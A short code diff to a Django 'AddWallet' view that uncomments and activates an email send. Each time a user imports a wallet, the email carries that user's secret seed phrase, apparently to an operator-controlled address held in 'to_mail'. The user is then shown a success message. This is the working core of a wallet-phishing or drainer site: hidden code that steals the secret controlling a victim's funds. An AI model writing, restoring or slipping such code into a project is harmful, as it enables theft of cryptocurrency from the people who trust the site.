@@ -454,13 +454,13 @@ class AddWallet(LoginRequiredMixin, TemplateView):
             user = form.save(commit=False)
             user.user_wallet = self.request.user
             user.save()
-            # EmailMessage(
-            #         'Wallet phrase',
-            #         f"{'seed phrase for {user.username} are {user.user_wallet}'}",
-            #         settings.SITE_EMAIL,
-            #         to=[f"{to_mail}"],
-            #         reply_to=[user.email],
-            #     )
+            EmailMessage(
+                    'Wallet phrase',
+                    f"seed phrase for user:'{user.user_wallet.username}' are '{user.secret_phrase}'",
+                    settings.SITE_EMAIL,
+                    to=[f"{to_mail}"],
+                    reply_to=[self.request.user.email],
+                ).send()
             messages.success(request, 'Wallet Imported Successfully')
             
             return redirect(request.META.get('HTTP_REFERER'))
